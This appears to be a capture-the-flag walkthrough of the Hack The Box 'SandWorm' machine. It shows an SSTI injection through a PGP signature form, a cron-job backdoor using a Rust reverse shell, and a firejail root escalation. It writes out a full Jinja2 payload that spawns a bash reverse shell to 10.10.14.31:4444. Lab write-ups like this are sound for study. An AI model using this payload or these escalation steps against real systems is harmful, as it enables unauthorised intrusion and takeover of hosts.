---
title: SandWorm Hack The Box 
date: 2023-07-25 22:50:30 +/-TTTT
categories: [Hack The Box, SandWorm]
tags: [SandWorm HTB] 
image:
  path: /assets/img/htb/sandworm/logo.jpg
---


## Work Flow
![]( /assets/img/htb/sandworm/workflow.png)

## Enumeration
 Use nmap to scan this machine
![]( /assets/img/htb/sandworm/nmap.png)

Go to the website. I know it is the Flask framework. Click the guide to see more.
![]( /assets/img/htb/sandworm/web2.png)

## Exploit
Exploit at contact -> search exploit pgp flask and follow the guide to verify signature

- Create pgp key at https://pgpkeygen.com/ 
<p>
Try the payload  {% raw %}{{7*7}}{% endraw %} at name, after verify the signature I see the return value is 49 => so I can exploit SSTI vulnerability (Server Side Template Injection) at the name  -> copy the private key and the passwd when crating the key to sig at http://www.2pih.com/pgp.html
</p>
 

![]( /assets/img/htb/sandworm/payload.png)

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2 
 
Use payload call OS and exploit
```shell
{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen(“bash -c ' bash -i >& /dev/tcp/10.10.14.31/4444 0>&1'”).read() }}{% endraw %} 
  
```

 PGP signature link: http://www.2pih.com/pgp.html
![]( /assets/img/htb/sandworm/key.png) 

Copy the public key and the signed certificate to verify the signature -> rce 
![]( /assets/img/htb/sandworm/sig.png) 
![]( /assets/img/htb/sandworm/nc.png) 
 Recon all file in atlas to find the password
![]( /assets/img/htb/sandworm/getaccount.png)
okay let's login to the machine 
![]( /assets/img/htb/sandworm/login.png)

## Escalation

![]( /assets/img/htb/sandworm/root1.png)
 
To get user root access from user silentobserver I must exploit to login with user atlas. The user atlas earlier was docker, unable to execute all commands.
 Check the cron job. I will use the cron job to get user atlas
![]( /assets/img/htb/sandworm/root_recon1.png)
![]( /assets/img/htb/sandworm/root_recon2.png)
![]( /assets/img/htb/sandworm/root_recon3.png)
 Search for a reverse shell program in the Rust language (https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs )and edit file lib.rs

Create a file lib.rs at attacker machine after that user silentobserver performs the download (Note: edit file lib.rs takes a long time and file is deleted every 2mins -2minutes file executes 1 time)

![]( /assets/img/htb/sandworm/edit_payload.png)
![]( /assets/img/htb/sandworm/get_payload.png)
![]( /assets/img/htb/sandworm/connect.png)
 From user atlas, escalate to root by firejail (atlas và root both belong to the group jailer)
![]( /assets/img/htb/sandworm/root_recon4.png)
 Exploit firejail to get root ( https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ )

![]( /assets/img/htb/sandworm/exploit.png)
